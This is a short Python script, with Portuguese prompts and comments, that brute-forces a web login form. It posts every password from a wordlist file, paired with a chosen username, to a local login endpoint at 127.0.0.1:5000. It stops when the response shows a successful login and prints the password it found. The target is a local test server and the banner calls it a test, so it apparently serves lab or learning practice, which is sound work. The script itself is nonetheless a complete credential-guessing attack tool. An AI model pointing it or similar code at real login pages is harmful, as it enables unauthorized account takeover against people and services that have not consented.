import requests
print("xxxxxxx Brute Force teste xxxxxxx")
usuario = input("Usuário: ")
wordlist = open(".\wordlist.txt", "r").readlines()
wordlist = [x.replace("\n", "") for x in wordlist]


# Crie um dicionário com as informações de login.
for senha in wordlist:
    login_data = {
        "nome": usuario,
        "password": senha}
    
    response = requests.post("http://127.0.0.1:5000/login", data=login_data).text
    if "Usuário Logado" not in response:
        print(f"Testando - {senha}")
    else:
        print(f"\033[32m[+] Senha encontrada - \033[0;0m{senha}")